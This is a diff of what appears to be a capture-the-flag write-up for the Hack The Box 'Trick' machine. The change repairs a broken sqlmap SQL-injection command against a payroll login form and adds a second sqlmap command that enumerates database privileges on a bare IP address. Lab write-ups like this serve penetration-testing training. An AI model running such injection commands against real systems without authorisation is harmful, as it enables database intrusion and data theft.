@@ -1,6 +1,5 @@
 ```zsh
-sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --
-data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
+sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
 ```
 
 we will use the technique flag in sqlmap to
@@ -14,6 +13,7 @@ instruct it to use specific techniques. sqlmap has the following techniques that
 
 ```bash
 sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data="username=admin&password=password" -p username --privileges --batch
+sqlmap -u "http://10.129.8.151:8443/login" --data="username=admin&password=password" -p username --privileges --batch
 ```
 
 ```zsh
